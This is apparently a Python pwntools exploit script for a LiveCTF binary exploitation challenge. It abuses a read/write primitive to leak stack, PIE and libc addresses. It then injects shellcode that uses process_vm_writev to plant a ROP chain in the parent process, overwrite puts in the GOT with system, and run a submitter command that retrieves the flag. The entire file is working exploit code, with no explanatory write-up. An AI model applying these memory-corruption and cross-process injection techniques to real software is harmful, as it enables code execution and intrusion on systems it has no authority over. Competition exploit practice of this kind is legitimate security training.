#!/usr/bin/env python3

from pwn import *
context.arch = "amd64"
context.log_level = "debug"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

def read(addr):
    io.sendlineafter(b"Choice: \n", b"1")
    io.sendlineafter(b"Address: \n", hex(addr).encode())
    io.recvuntil(b"Value: ")
    return int(io.recvline().decode().strip(), 16)

def write(addr, value):
    io.sendlineafter(b"Choice: \n", b"2")
    io.sendlineafter(b"Value: \n", hex(value).encode())
    io.sendlineafter(b"Address: \n", hex(addr).encode())

stack_leak = read(0)
print("stack leak:", hex(stack_leak))
ret_addr = stack_leak - 272
print("ret addr:", hex(ret_addr))

pie_leak = read(stack_leak + 15*8)
print("pie leak:", hex(pie_leak))
pie = pie_leak - 64
print("pie:", hex(pie))
puts = read(pie+0x000034d8)
libc = puts - 0x000000000080e50
print("libc:", hex(libc))
system = libc + 0x000000000050d70

pop_rbx = 0x000000000000148a + pie
call_puts_rbx = 0x000159a + pie
puts_got = 0x00034d8 + pie
bss = pie + 0x3600

parent_rop = p64(pop_rbx) + p64(bss) + p64(call_puts_rbx) + p64(pie+0x0001210)
parent_rop_size = len(parent_rop)

code = f'''
mov rax,110
syscall

// write rop chain
mov r13,rax
mov rdi,r13
mov eax,{parent_rop_size}
push rax
mov rax,{ret_addr}
push rax
mov r10,rsp
mov r8d,1
xor r9d,r9d
mov eax,{parent_rop_size}
push rax
lea rax,[rip+parent_rop]
push rax
mov rsi,rsp
mov edx,1
mov rax,311
syscall

// write puts got
mov rdi,r13
mov eax,8
push rax
mov rax,{puts_got}
push rax
mov r10,rsp
mov r8d,1
xor r9d,r9d
mov eax,8
push rax
lea rax,[rip+system_addr]
push rax
mov rsi,rsp
mov edx,1
mov rax,311
syscall

// command to bss
mov rdi,r13
mov eax,12
push rax
mov rax,{bss}
push rax
mov r10,rsp
mov r8d,1
xor r9d,r9d
mov eax,12
push rax
lea rax,[rip+command]
push rax
mov rsi,rsp
mov edx,1
mov rax,311
syscall

aaa:
jmp aaa
system_addr:
    .quad {system}
command:
    .asciz "./submitter"
parent_rop:
'''

code = asm(code) + parent_rop

for i in range(0, len(code), 8):
    write(pie+0x0001488+i, int.from_bytes(code[i:i+8], "little"))
write(pie+0x1486, int.from_bytes(b"\x90\x90"+code[:6], "little"))

io.sendlineafter(b"Choice: \n", b"3")

flag = io.recvline_contains(b'LiveCTF{').decode().strip()
#flag = io.recvline().decode().strip()
log.info('Flag: %s', flag)

io.interactive()
